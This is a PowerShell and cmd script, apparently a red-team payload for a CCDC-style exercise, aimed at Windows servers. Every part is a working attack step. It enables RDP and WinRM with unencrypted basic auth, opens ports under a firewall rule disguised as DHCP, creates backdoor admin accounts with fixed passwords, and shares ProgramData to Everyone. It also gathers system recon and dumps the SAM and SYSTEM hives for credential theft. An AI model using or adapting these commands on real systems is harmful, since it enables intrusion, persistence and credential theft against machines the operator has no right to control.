# ============================================================
# SERVER SECONDARY PAYLOAD - Tier 2 (Windows Servers)
# ============================================================
# RDP enablement + user creation + lateral movement prep
# Target: Windows Servers (sustained access)
# ============================================================

# RDP ENABLEMENT: Enable RDP + allow through firewall
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0 -Type DWord; cmd /c 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes'

# RDP ENABLEMENT: Open specific ports (RDP, WinRM, SMB) with innocent-looking rule names
cmd /c "netsh advfirewall firewall add rule name=""Core Networking - DHCP (UDP-In)"" dir=in action=allow protocol=tcp localport=3389,5985,5986,445 enable=yes"

# USER CREATION: Create local admin (pure cmd, no PowerShell cmdlets)
cmd /c "net user svcAdmin Pa$$w0rd2026! /add & net localgroup Administrators svcAdmin /add"

# USER CREATION: Enable built-in Administrator + set password
cmd /c "net user Administrator /active:yes & net user Administrator Adm1nCCDC2026!"

# LATERAL MOVEMENT: Enable WinRM for lateral movement
cmd /c "winrm quickconfig -quiet & winrm set winrm/config/service @{AllowUnencrypted=""true""} & winrm set winrm/config/service/auth @{Basic=""true""}"

# LATERAL MOVEMENT: SMB share creation for file staging
cmd /c "net share RedTeam=C:\ProgramData /grant:Everyone,FULL /unlimited"

# RECONNAISSANCE: Full system + network enumeration
$o=@(); $o+="=== HOSTNAME ==="; $o+=hostname; $o+="=== USERS ==="; $o+=cmd /c "net user"; $o+="=== ADMINS ==="; $o+=cmd /c "net localgroup Administrators"; $o+="=== NETWORK ==="; $o+=ipconfig /all; $o+="=== CONNECTIONS ==="; $o+=netstat -an; $o+="=== ARP ==="; $o+=arp -a; $o+="=== SERVICES ==="; $o+=cmd /c "sc query state= all"; $o | Out-File C:\ProgramData\r.txt -Force

# CREDENTIAL ACCESS: Dump SAM + SYSTEM hives
cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y"
